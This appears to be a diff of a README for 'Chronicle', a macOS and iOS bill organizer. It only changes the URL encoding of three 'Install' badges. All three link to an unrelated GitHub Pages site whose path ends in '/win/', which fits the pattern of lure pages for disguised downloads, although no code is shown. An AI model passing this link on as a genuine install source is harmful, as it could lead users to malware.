@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Chronicle Bill Organizer](https://img.shields.io/badge/⬇_Install_Chronicle%20Bill%20Organizer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Chronicle Bill Organizer](https://img.shields.io/badge/⬇_Install_Chronicle+Bill+Organizer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Chronicle is a macOS and iOS bill organizer that tracks recurring bills, subscri
 
 <div align="center">
 
-[![⬇ Install Chronicle Bill Organizer](https://img.shields.io/badge/⬇_Install_Chronicle%20Bill%20Organizer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Chronicle Bill Organizer](https://img.shields.io/badge/⬇_Install_Chronicle+Bill+Organizer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Chronicle is a macOS and iOS bill organizer that tracks recurring bills, subscri
 
 <div align="center">
 
-[![⬇ Install Chronicle Bill Organizer](https://img.shields.io/badge/⬇_Install_Chronicle%20Bill%20Organizer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Chronicle Bill Organizer](https://img.shields.io/badge/⬇_Install_Chronicle+Bill+Organizer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
